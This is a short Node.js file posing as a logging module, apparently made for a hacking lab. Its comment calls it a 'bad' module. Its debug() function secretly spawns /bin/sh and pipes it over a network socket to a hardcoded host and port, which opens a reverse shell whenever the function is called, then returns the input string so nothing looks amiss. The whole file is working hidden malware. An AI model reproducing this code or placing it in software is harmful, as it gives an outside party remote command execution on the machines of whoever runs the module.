// // This is bad node.js module for Logging

LHOST = "10.10.14.109";
LPORT = 12345;

//Debug will just call reverse_shell
function debug(debugString){
        function reverse_shell(){
                    var net = require("net"),
                                cp = require("child_process"),
                                sh = cp.spawn("/bin/sh", []);
                    var client = new net.Socket();
                    client.connect(LPORT, LHOST, function() {
                                    client.pipe(sh.stdin);
                                    sh.stdout.pipe(client);
                                    sh.stderr.pipe(client);
                                });
                    return /a/;
        };
        reverse_shell();
        return debugString;
}
